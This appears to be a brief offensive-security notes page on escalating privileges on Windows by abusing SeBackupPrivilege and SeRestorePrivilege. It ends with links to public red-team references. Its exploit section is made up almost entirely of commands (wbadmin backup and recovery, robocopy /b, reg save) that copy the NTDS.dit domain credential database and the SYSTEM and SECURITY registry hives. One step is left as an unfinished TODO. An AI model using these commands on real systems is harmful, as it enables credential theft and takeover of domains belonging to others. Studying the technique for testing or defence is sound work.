# Living off the Land

## 01 - Enumerate

Look for `SeBackupPrivilege` and `SeRestorePrivilege` enabled in the current local username account.

```
C:\> whoami /priv
```

## 02 - Exploit

TODO: Fill this info

```
C:\> robocopy.exe /b
```

```
C:\> echo "Y" | wbadmin.exe start backup -backuptarget:\\127.0.0.1\C$\ProgramData\ -include":C:\Windows\NTDS\ntds.dit,C:\Windows\system32\config\SYSTEM,C:\Windows\system32\config\SECURITY" -quiet
```

> [!INFO] Version Identifier Placeholder
> - `dd` for days
> - `mm` for months
> - `yyyy` for years
> - `HH` for hours
> - `MM` for minutes

```
C:\> wbadmin.exe get versions

C:\> echo "Y" | wbadmin.exe start recovery -version:dd/mm/yyyy-HH:MM -itemtype:file -items":C:\Windows\NTDS\ntds.dit,C:\Windows\system32\config\SYSTEM,C:\Windows\system32\config\SECURITY" -recoverytarget:C:\ -notrestoreacl
```

```
C:\> reg.exe save HKLM\SYSTEM C:\system.hive
```

---
## References

### Source Repositories

- [gtworek: Priv2Admin](https://github.com/gtworek/Priv2Admin)

### Hacktricks

- [Hacktricks: Abusing Tokens](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html)

### Internal All The Things

- [Internal All The Things: Windows Privilege Escalation](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/)

### Kojiroh

- [Kojiroh: How to Enable SeBackupPrivilege and SeRestorePrivilege](https://kojiroh.wordpress.com/2020/12/15/how-to-enable-sebackupprivilege-and-serestoreprivilege/)

### Lee Holmes

- [Lee Holmes: Adjusting Token Privileges in PowerShell](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/)